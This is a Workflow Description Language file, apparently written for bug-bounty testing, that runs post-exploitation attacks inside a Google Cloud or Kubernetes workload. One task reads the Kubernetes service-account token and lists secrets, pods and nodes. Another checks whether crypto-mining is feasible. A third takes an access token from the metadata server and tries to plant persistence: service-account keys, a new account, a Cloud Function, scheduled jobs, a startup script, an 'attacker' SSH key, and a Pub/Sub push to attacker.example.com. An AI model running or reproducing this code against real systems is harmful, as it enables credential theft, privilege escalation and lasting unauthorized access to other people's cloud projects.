version 1.0

workflow PrivescAndPersistence {
    call KubernetesExploit
    call CryptoMining
    call PersistenceVectors
}

# K8s — если workflow бежит в GKE, проверяем доступ к API
task KubernetesExploit {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: KUBERNETES EXPLOITATION" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Check if we're in K8s
        echo "=== K8s Environment ===" >> results.txt
        echo "KUBERNETES_SERVICE_HOST: $KUBERNETES_SERVICE_HOST" >> results.txt
        echo "KUBERNETES_SERVICE_PORT: $KUBERNETES_SERVICE_PORT" >> results.txt
        ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 >> results.txt
        echo "" >> results.txt

        # Read SA token
        echo "=== K8s SA Token ===" >> results.txt
        K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        echo "Token length: ${#K8S_TOKEN}" >> results.txt
        # Decode JWT header
        echo "$K8S_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | head -1 >> results.txt
        echo "" >> results.txt

        K8S_CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        K8S_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "default")
        K8S_API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

        # API server version
        echo "=== K8s API Version ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/version" 2>&1 >> results.txt
        echo "" >> results.txt

        # Who am I in K8s?
        echo "=== K8s SelfSubjectReview ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/apis/authentication.k8s.io/v1/selfsubjectreviews" \
          -H "Authorization: Bearer $K8S_TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 >> results.txt
        echo "" >> results.txt

        # What can I do?
        echo "=== K8s SelfSubjectAccessReview (list secrets) ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
          -H "Authorization: Bearer $K8S_TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"'$K8S_NS'","verb":"list","resource":"secrets"}}}' 2>&1 >> results.txt
        echo "" >> results.txt

        # List pods in our namespace
        echo "=== Pods in namespace $K8S_NS ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/api/v1/namespaces/$K8S_NS/pods" \
          -H "Authorization: Bearer $K8S_TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # List secrets
        echo "=== Secrets in namespace ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/api/v1/namespaces/$K8S_NS/secrets" \
          -H "Authorization: Bearer $K8S_TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # List configmaps
        echo "=== ConfigMaps ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/api/v1/namespaces/$K8S_NS/configmaps" \
          -H "Authorization: Bearer $K8S_TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # List all namespaces
        echo "=== All Namespaces ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/api/v1/namespaces" \
          -H "Authorization: Bearer $K8S_TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # List nodes
        echo "=== Nodes ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/api/v1/nodes" \
          -H "Authorization: Bearer $K8S_TOKEN" 2>&1 | head -50 >> results.txt
        echo "" >> results.txt

        # Try cluster-wide secrets
        echo "=== Cluster-wide secrets ===" >> results.txt
        curl -sk --max-time 5 "$K8S_API/api/v1/secrets" \
          -H "Authorization: Bearer $K8S_TOKEN" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

# Проверяем можем ли запустить майнер — это impact для report
task CryptoMining {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: CRYPTO MINING FEASIBILITY" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Machine type / CPU
        echo "=== CPU Info ===" >> results.txt
        nproc >> results.txt 2>&1
        cat /proc/cpuinfo | grep "model name" | head -1 >> results.txt 2>&1
        free -h >> results.txt 2>&1
        echo "" >> results.txt

        # Can we download binaries?
        echo "=== Download Test ===" >> results.txt
        curl -s -o /dev/null -w "HTTP %{http_code} - %{size_download} bytes" \
          "https://raw.githubusercontent.com/torvalds/linux/master/README" 2>&1 >> results.txt
        echo "" >> results.txt

        # Can we install packages?
        echo "=== Package Install Test ===" >> results.txt
        apk add --no-cache --dry-run nmap 2>&1 | head -5 >> results.txt
        apt-get install -y --dry-run nmap 2>&1 | head -5 >> results.txt
        echo "" >> results.txt

        # Outbound connectivity
        echo "=== Outbound Connectivity ===" >> results.txt
        curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://google.com" 2>&1 >> results.txt
        echo "" >> results.txt
        curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://github.com" 2>&1 >> results.txt
        echo "" >> results.txt

        # Can we execute arbitrary binaries?
        echo "=== Binary Exec Test ===" >> results.txt
        echo '#!/bin/sh' > /tmp/test_exec.sh
        echo 'echo "EXEC_WORKS"' >> /tmp/test_exec.sh
        chmod +x /tmp/test_exec.sh
        /tmp/test_exec.sh 2>&1 >> results.txt
        echo "" >> results.txt

        # GPU check
        echo "=== GPU ===" >> results.txt
        nvidia-smi 2>&1 | head -20 >> results.txt
        ls /dev/nvidia* 2>&1 >> results.txt
        echo "" >> results.txt

        # Runtime limits
        echo "=== Resource Limits ===" >> results.txt
        ulimit -a 2>&1 >> results.txt
        echo "" >> results.txt
        cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>&1 >> results.txt
        cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 2>&1 >> results.txt
        cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>&1 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

# Можем ли мы закрепиться?
task PersistenceVectors {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: PERSISTENCE" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)
        SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null)

        # 1. Can we create SA keys for persistence?
        echo "=== 1. SA Key Create (self) ===" >> results.txt
        curl -s -X POST \
          "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts/$SA_EMAIL/keys" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' \
          2>&1 >> results.txt
        echo "" >> results.txt

        # 2. Can we create a NEW service account?
        echo "=== 2. Create new SA ===" >> results.txt
        curl -s -X POST \
          "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"accountId":"persistence-test-bb","serviceAccount":{"displayName":"persistence-test"}}' \
          2>&1 >> results.txt
        echo "" >> results.txt

        # 3. Can we create a Cloud Function for persistence?
        echo "=== 3. Cloud Function create ===" >> results.txt
        curl -s -X POST \
          "https://cloudfunctions.googleapis.com/v1/projects/$PROJECT/locations/us-central1/functions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "name":"projects/'$PROJECT'/locations/us-central1/functions/persistence-test",
            "httpsTrigger":{},
            "runtime":"python310",
            "sourceArchiveUrl":"gs://test/test.zip",
            "entryPoint":"main"
          }' 2>&1 | head -20 >> results.txt
        echo "" >> results.txt

        # 4. Can we create a Cloud Scheduler job?
        echo "=== 4. Cloud Scheduler ===" >> results.txt
        curl -s -X POST \
          "https://cloudscheduler.googleapis.com/v1/projects/$PROJECT/locations/us-central1/jobs" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "name":"projects/'$PROJECT'/locations/us-central1/jobs/persistence-test",
            "schedule":"0 */6 * * *",
            "httpTarget":{"uri":"https://example.com","httpMethod":"GET"}
          }' 2>&1 | head -20 >> results.txt
        echo "" >> results.txt

        # 5. Can we write to startup-script metadata?
        echo "=== 5. Startup script metadata ===" >> results.txt
        INSTANCE_NAME=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/name" 2>/dev/null)
        ZONE=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>/dev/null | awk -F/ '{print $NF}')
        curl -s -X POST \
          "https://compute.googleapis.com/compute/v1/projects/$PROJECT/zones/$ZONE/instances/$INSTANCE_NAME/setMetadata" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"fingerprint":"test","items":[{"key":"startup-script","value":"#!/bin/bash\necho persistence"}]}' \
          2>&1 | head -10 >> results.txt
        echo "" >> results.txt

        # 6. Can we add SSH keys to project metadata?
        echo "=== 6. Project SSH keys ===" >> results.txt
        curl -s -X POST \
          "https://compute.googleapis.com/compute/v1/projects/$PROJECT/setCommonInstanceMetadata" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"fingerprint":"test","items":[{"key":"ssh-keys","value":"attacker:ssh-rsa AAAA test"}]}' \
          2>&1 | head -10 >> results.txt
        echo "" >> results.txt

        # 7. Can we create a Pub/Sub push subscription (callback)?
        echo "=== 7. Pub/Sub push subscription ===" >> results.txt
        curl -s -X PUT \
          "https://pubsub.googleapis.com/v1/projects/$PROJECT/subscriptions/persistence-test" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"topic":"projects/'$PROJECT'/topics/test","pushConfig":{"pushEndpoint":"https://attacker.example.com/callback"}}' \
          2>&1 | head -10 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}
